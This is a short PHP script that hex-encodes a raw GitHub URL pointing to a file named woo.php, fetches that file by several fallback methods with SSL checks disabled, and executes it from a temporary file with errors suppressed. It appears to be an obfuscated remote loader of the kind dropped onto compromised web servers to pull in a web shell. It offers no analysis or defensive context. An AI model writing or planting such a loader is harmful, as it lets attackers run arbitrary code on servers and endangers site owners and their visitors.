<?php
$h1="68747470733a2f2f7261772e6769";
$h2="7468756275736572636f6e74656e";
$h3="742e636f6d2f416c766158506c6f";
$h4="69742f53454e492f726566732f68";
$h5="656164732f6d61696e2f776f6f2e";
$h6="706870";

$url = pack("H*", $h1.$h2.$h3.$h4.$h5.$h6);

$content = @file_get_contents($url);
 
if(!$content && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
    $content = curl_exec($ch);
    curl_close($ch);
}

if(!$content && ini_get('allow_url_fopen')) {
    $handle = @fopen($url, 'r');
    if($handle) {
        $content = stream_get_contents($handle);
        fclose($handle);
    }
}

if($content && strlen(trim($content)) > 10) {
    $tmp = tempnam(sys_get_temp_dir(), 'php');
    file_put_contents($tmp, $content);
    @include $tmp;
    @unlink($tmp);
} else {
    echo "<h3>Remote Loader</h3>";
    echo "<p>URL: " . htmlspecialchars($url) . "</p>";
    echo "<p>Status: Failed to fetch content</p>";
    
    echo "<p>Testing URL... ";
    $headers = @get_headers($url);
    if($headers && $headers[0]) {
        echo $headers[0];
    } else {
        echo "Cannot connect";
    }
    echo "</p>";
}
?>
